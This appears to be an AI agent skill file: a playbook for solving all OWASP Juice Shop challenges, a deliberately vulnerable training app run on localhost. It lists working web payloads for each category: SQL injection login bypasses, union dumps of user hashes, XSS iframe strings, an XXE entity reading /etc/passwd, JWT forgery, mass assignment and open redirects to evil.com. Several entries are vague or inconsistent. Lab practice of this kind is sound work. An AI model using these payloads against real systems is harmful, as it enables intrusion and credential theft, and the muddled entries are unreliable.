---
name: juice-shop-116
description: Per-challenge playbook to solve ALL 116 OWASP Juice Shop challenges. Use when the target is OWASP Juice Shop. Lists the exact technique for every challenge by category, plus admin bootstrap, the 35 coding fixes, and the ground-truth coverage API. Load alongside juice-shop-hunt.
source_repo: custom
source_path: ''
source_license: original
---
# Juice Shop — solve ALL 116 (per-challenge playbook)

Ground truth: `curl http://localhost:3000/api/Challenges/` (shows solved/unsolved per challenge).
The app **auto-marks a challenge solved** when you trigger it — poll this endpoint to track coverage.

## BOOTSTRAP (do first — unlocks many)
1. **SQLi admin login**: `POST /rest/user/login` `{"email":"' OR 1=1--","password":"x"}` → admin token.
   Or default creds `admin@juice-sh.op` / `admin123`.
2. Save the admin JWT. Use it as `Authorization: Bearer <token>` for admin challenges.
3. Register a normal user for BOLA/IDOR tests (two accounts).

## Broken Authentication (9)
- **Login Bjoern** — SQLi `bjoern@juice-sh.op' --` (email), any password.
- **Bjoern's Favorite Pet** — reset via security question; answer = his pet (OSINT: `zaya`).
- **Reset Jim's / Bender's / Bjoern's Password** — use security questions; answers are in
  `data/static/securityQuestions.yml` (e.g. Jim: `Samuel`, Bender: `Stop'n'Drop`, Bjoern: `West-2082`).
- **Change Bender's Password** — `GET /rest/user/change-password?current=&new=...` for Bender via the reset flow.
- **Two Factor Authentication** — `POST /rest/2fa/verify` with a forged TOTP; secret from
  `POST /rest/2fa/setup` / `GET /rest/2fa/status` (leaks `secret`).
- **GDPR Data Erasure** — log in as `chris.pike@juice-sh.op` (SQLi), then DELETE /rest/user/data-export flow.

## Broken Access Control (12)
- **Admin Section** — login as admin, visit `/#/administration`.
- **Five-Star Feedback** — as admin `PUT /api/Feedbacks/{id}` rating 5.
- **Manipulate Basket** — add a second basket item as another user (IDOR) or
  `POST /api/BasketItems` with another `BasketId`.
- **Product Tampering** — `PUT /api/Products/{id}` as admin (change a product).
- **Forged Feedback / View another basket** — IDOR `GET /rest/basket/{id}`.
- **CSRF** — use the profile/username form (no CSRF token) to change a value cross-site.
- **SSRF** — `POST /profile/image/url` (or the image URL field) pointing at an internal URL.
- **Web3 Sandbox** — navigate to `/#/web3-sandbox`.
- **AI Debugging** — trigger a debug/error path that exposes the AI config.

## Security Misconfiguration (5)
- **Error Handling** — send malformed input → verbose stack trace.
- **Deprecated Interface** — `POST /b2b/v2/orders` (deprecated B2B API).
- **XXE Data Access** — upload an XML order/invoice with an external entity.
- **Cross-Site Imaging / access log** — `GET /support/logs`, `/metrics`.
- **robots.txt / /ftp** — `GET /robots.txt` → `/ftp`.

## Vulnerable Components (9)
- **Forgotten Developer Backup** — `GET /ftp/package.json.bak%2500.md` (null-byte).
- **Legacy Components / Vulnerable Library** — fingerprint versions from `/ftp/package.json.bak` and the JS bundles; map to CVEs.
- **Outdated Whitelist / Withheld Backup** — `/ftp` listing for `.bak`, `.md`, `.yml` files.

## Cryptographic Issues (5)
- **Forged Coupon** — coupon = `z85`/HMAC; the key is the MD5 of the code (see `lib/insecurity.ts`):
  `coupon = z85.encode(crypto.createHmac('sha256', '<key>').update(code).digest())`. Use the leaked logic.
- **Forged Signed JWT** — RS256→HS256 confusion using `jwt.pub` (public key) as HMAC secret.
- **Unsigned JWT** — `alg:none`.
- **Nested Easter Egg / Weird Crypto** — crack the weak hash / find the Easter egg in the code.
- **Imaginary Challenge** — solve a hidden challenge.

## Injection (14)
- **Login Admin** — `' OR 1=1--`.
- **Database Schema** — Union SQLi on `/rest/products/search?q=` to dump `sqlite_master`.
- **User Credentials** — Union SQLi to dump `Users` (emails + password hashes).
- **Christmas Special / NoSQL** — `POST /rest/products/reviews` with `{"$ne":...}` or Mongo-style.
- **NoSQL DoS / Manipulation** — malformed NoSQL payload.
- **Ephemeral Accountant** — SQLi in login to auth as `acc0unt4nt@juice-sh.op`.
- **Christmas Special** — order the Christmas product.
- **API-only XSS / SSRF** (adjacent).
- **Deluxe Fraud / Zero Stars** — see Improper Input Validation.

## XSS (9)
- **DOM XSS** — `/#/search?q=<iframe src="javascript:alert(document.domain)">`.
- **Reflected XSS** — `/#/track-result?id=<iframe src="javascript:alert(`xss`)">`.
- **Stored XSS** — post a product review / feedback with `<iframe src="javascript:alert(`xss`)">`.
- **API-only XSS** — `PUT /api/Products/{id}` description with a payload.
- **HTTP-Header XSS** — inject via a header reflected into the page.
- **CSP Bypass** — use the allowed CDN (e.g. `https://cdnjs.cloudflare.com`) script tag.
- **Bypass Security Policy** — Angular `bypassSecurityTrustHtml` via the chat/other sink.
- **Client-side XSS Protection / Server-side XSS** — bypass the filter.

## Sensitive Data Exposure (17)
- **Confidential Document** — `GET /ftp/legal.md` / confidential file in `/ftp`.
- **Forgotten Backup** — `package.json.bak` (null byte).
- **Login Bjoern** — see Broken Auth.
- **Access Log** — `GET /support/logs` (download the access log).
- **Prometheus Metrics** — `GET /metrics`.
- **Exposed JWT / public key** — `GET /encryptionkeys/jwt.pub`, `/encryptionkeys/premium.key`.
- **Exposed credentials / audit.json** — `GET /ftp/audit.json`, `/api/Feedbacks`, `/api/Complaints`.
- **Privacy Policy / Data Export / Meta Geo Stalking** — profile & privacy pages.
- **Email Leak (JSONP)** — `GET /rest/user/whoami?callback=foo` leaks another user via JSONP.
- **NFT Takeover / Mint the Honey Pot** — web3 flows.
- **Security Questions leak** — `GET /api/SecurityQuestions/`.

## Improper Input Validation (12)
- **Zero Stars** — `POST /api/Feedbacks` rating `0`.
- **Negative Quantity** — `PUT /api/BasketItems/{id}` quantity `-1`.
- **Deluxe Price / Free Deluxe** — manipulate basket total.
- **Poison Null Byte** — `%2500` in a filename.
- **Missing Encoding** — filename with `%` sequences.
- **Empty User Registration / Register Admin** — `POST /api/Users` with empty/extra fields.
- **Mass Assignment** — `POST /api/Users` with `"role":"admin"` → self-promote.
- **Admin Registration** — same as above.
- **Weak Password** — register with a password the policy should reject.

## Broken Anti Automation (4)
- **CAPTCHA Bypass** — submit the form repeatedly; the captcha is client-side only.
- **Multiple Likes** — `POST /api/Feedbacks` like the same review many times.
- **Extra Language** — request a language not offered (`?lng=`), get 100 points.
- **Reset Morty's Password** — brute-force the security question (public info).

## Security through Obscurity (3)
- **Honeypot** — visit the hidden trap path (`/ftp`).
- **Access a hidden path** — `/support/logs`, `/.well-known/...`.
- **Misplaced Path** — discover the unlinked route.

## Observability Failures (4)
- **Access Log** — download `/support/logs`.
- **Metrics** — `/metrics`.
- **Exposed via logs** — leak from logs.
- **Health check leak** — `/rest/admin/application-configuration`.

## Miscellaneous (6)
- **Bully Chatbot** — tell the chatbot to give you a coupon.
- **Kill Chatbot** — send a payload that crashes/ends the chat.
- **Video XSS** — inject into the promo video URL.
- **Cross-Site Imaging** — `?url=` image proxy → SSRF/XSS.
- **SSTI** — inject a template expression where rendered.
- **Arbitrary File Write** — upload/write a file to a server path.

## Insecure Deserialization (3)
- **Chain** — craft a serialized payload.
- **Crypto / YAML / B2B** — deserialize an untrusted blob.

## Unvalidated Redirects (2)
- **Allowlist Bypass** — `GET /redirect?to=` with a bypass (`https://evil.com`, `//evil.com`).
- **Unvalidated Redirect** — open redirect on the `to` param.

## XXE (2)
- **XXE Data Access** — XML order with `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
- **XXE DoS** — billion laughs / entity loop.

## The 35 coding challenges
For each challenge flagged with a coding fix: find the vulnerable source in the Juice Shop repo
(`https://github.com/juice-shop/juice-shop`) — typically `lib/insecurity.ts`, `routes/*.ts`,
`server.ts`, `models/*.ts` — and describe the fix (parameterized queries, output encoding,
authz checks, safe deserialization, input validation). The repo marks vulnerable lines with
`// vuln-code-snippet` comments — grep those.

## Workflow
1. Bootstrap admin + a normal user.
2. `curl /api/Challenges/` → iterate unsolved, apply the matching technique above.
3. After each attempt, re-poll `/api/Challenges/` to confirm the solve.
4. Report every confirmed solve with its request/response evidence.
5. Keep going until the unsolved list stops shrinking.
